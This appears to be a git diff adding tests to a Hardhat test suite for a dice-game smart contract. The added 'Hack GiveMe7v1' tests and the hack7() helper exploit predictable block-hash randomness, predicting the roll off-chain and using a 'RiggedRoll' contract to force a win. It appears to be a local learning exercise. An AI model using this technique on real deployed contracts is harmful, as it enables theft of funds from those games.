@@ -1,17 +1,26 @@
 const { assert, expect } = require("chai")
+const { BigNumber } = require("ethers")
 const { ethers, network, upgrades, getNamedAccounts } = require("hardhat")
 const { networkConfig } = require("../../helper-hardhat-config")
 const chainId = network.config.chainId
+let proxy,
+    txResponse,
+    txReceipt,
+    vrfCoordinatorV2Mock,
+    nonce,
+    subscriptionId,
+    giveMe7v1,
+    hackGiveMe7v1,
+    provider,
+    giveMe7v1Standalone
 
 chainId != 31337
     ? describe.skip
     : describe("GiveMe7 Unit testing", () => {
-          let proxy, txResponse, txReceipt, vrfCoordinatorV2Mock, nonce, subscriptionId
-
           beforeEach(async () => {
               //   await deployments.fixture(["v1", "mocks"])
 
-              const giveMe7v1 = await ethers.getContractFactory("GiveMe7v1")
+              giveMe7v1 = await ethers.getContractFactory("GiveMe7v1")
               proxy = await upgrades.deployProxy(giveMe7v1)
               await proxy.deployed()
 
@@ -76,6 +85,26 @@ chainId != 31337
                   it("Should increase nonce", async () => {
                       const newNonce = await proxy.getNonce()
                       assert.equal(newNonce.toString(), nonce.toString())
+                  })
+              })
+              describe("Hack GiveMe7v1", () => {
+                  beforeEach(async () => {
+                      giveMe7v1Standalone = await ethers.getContract("GiveMe7v1Standalone")
+                      hackGiveMe7v1 = await ethers.getContract("RiggedRoll")
+                      const accounts = await ethers.getSigners()
+                      user = accounts[1]
+                      provider = await ethers.getDefaultProvider(network.config.url)
+                      await hack7()
+                  })
+
+                  it("Should emit Roll event", async () => {
+                      txResponse = await hackGiveMe7v1.riggedRoll()
+                      await expect(txResponse).to.emit(giveMe7v1Standalone, "Roll")
+                  })
+
+                  it("Should emit Winner event", async () => {
+                      txResponse = await hackGiveMe7v1.riggedRoll()
+                      await expect(txResponse).to.emit(giveMe7v1Standalone, "Winner")
                   })
               })
           })
@@ -179,3 +208,30 @@ chainId != 31337
               })
           })
       })
+
+async function hack7() {
+    const provider = await ethers.getDefaultProvider(network.config.url)
+    let expectedRoll
+
+    while (true) {
+        const latestBlockNumber = await provider.getBlockNumber()
+        const block = await provider.getBlock(latestBlockNumber)
+        const prevHash = block.hash
+        const nonce = await giveMe7v1Standalone.getNonce()
+
+        const hash = ethers.utils.solidityKeccak256(
+            ["bytes32", "address", "uint256"],
+            [prevHash, giveMe7v1Standalone.address, nonce]
+        )
+
+        const bigNum = BigNumber.from(hash)
+        expectedRoll = bigNum.mod(9).toString()
+        if (expectedRoll == "7") {
+            break
+        }
+
+        await giveMe7v1Standalone.rollTheDice({ value: ethers.utils.parseEther("0.002") })
+    }
+
+    return expectedRoll
+}
